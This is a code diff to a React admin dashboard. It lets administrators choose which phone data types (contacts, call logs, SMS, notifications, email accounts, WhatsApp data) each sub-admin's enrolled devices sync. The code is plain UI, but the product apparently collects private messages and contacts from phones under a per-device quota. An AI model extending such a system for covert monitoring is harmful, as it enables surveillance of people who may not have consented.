@@ -450,6 +450,9 @@ export default function AdminDashboard() {
                                                 Max Devices
                                             </th>
                                             <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
+                                                Allowed Data Types
+                                            </th>
+                                            <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                                 Created
                                             </th>
                                             <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
@@ -473,6 +476,19 @@ export default function AdminDashboard() {
                                                 </td>
                                                 <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                                     {subAdmin.maxDevices}
+                                                </td>
+                                                <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
+                                                    {subAdmin.allowedDataTypes && subAdmin.allowedDataTypes.length > 0 ? (
+                                                        <div className="flex flex-wrap gap-1">
+                                                            {subAdmin.allowedDataTypes.map((dataType) => (
+                                                                <span key={dataType} className="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium bg-blue-100 text-blue-800">
+                                                                    {dataType.replace('_', ' ')}
+                                                                </span>
+                                                            ))}
+                                                        </div>
+                                                    ) : (
+                                                        <span className="text-gray-400">None</span>
+                                                    )}
                                                 </td>
                                                 <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                                     {new Date(subAdmin.createdAt).toLocaleDateString()}
@@ -888,8 +904,27 @@ function AddSubAdminModal({ onClose, onAdd }) {
         username: '',
         email: '',
         password: '',
-        maxDevices: 1
+        maxDevices: 1,
+        allowedDataTypes: []
     });
+
+    const dataTypeOptions = [
+        { value: 'CONTACTS', label: 'Contacts' },
+        { value: 'CALL_LOGS', label: 'Call Logs' },
+        { value: 'MESSAGES', label: 'SMS Messages' },
+        { value: 'NOTIFICATIONS', label: 'Notifications' },
+        { value: 'EMAIL_ACCOUNTS', label: 'Email Accounts' },
+        { value: 'WHATSAPP', label: 'WhatsApp Data' }
+    ];
+
+    const handleDataTypeChange = (dataType) => {
+        setFormData(prev => ({
+            ...prev,
+            allowedDataTypes: prev.allowedDataTypes.includes(dataType)
+                ? prev.allowedDataTypes.filter(type => type !== dataType)
+                : [...prev.allowedDataTypes, dataType]
+        }));
+    };
 
     const handleSubmit = (e) => {
         e.preventDefault();
@@ -943,6 +978,25 @@ function AddSubAdminModal({ onClose, onAdd }) {
                                 onChange={(e) => setFormData({...formData, maxDevices: parseInt(e.target.value)})}
                                 className="mt-1 block w-full border border-gray-300 rounded-md px-3 py-2"
                             />
+                        </div>
+                        <div>
+                            <label className="block text-sm font-medium text-gray-700 mb-2">Allowed Data Types</label>
+                            <div className="space-y-2">
+                                {dataTypeOptions.map((option) => (
+                                    <label key={option.value} className="flex items-center">
+                                        <input
+                                            type="checkbox"
+                                            checked={formData.allowedDataTypes.includes(option.value)}
+                                            onChange={() => handleDataTypeChange(option.value)}
+                                            className="mr-2"
+                                        />
+                                        <span className="text-sm text-gray-700">{option.label}</span>
+                                    </label>
+                                ))}
+                            </div>
+                            <p className="text-xs text-gray-500 mt-1">
+                                Select which data types this sub-admin's devices can sync
+                            </p>
                         </div>
                         <div className="flex justify-end space-x-3">
                             <button
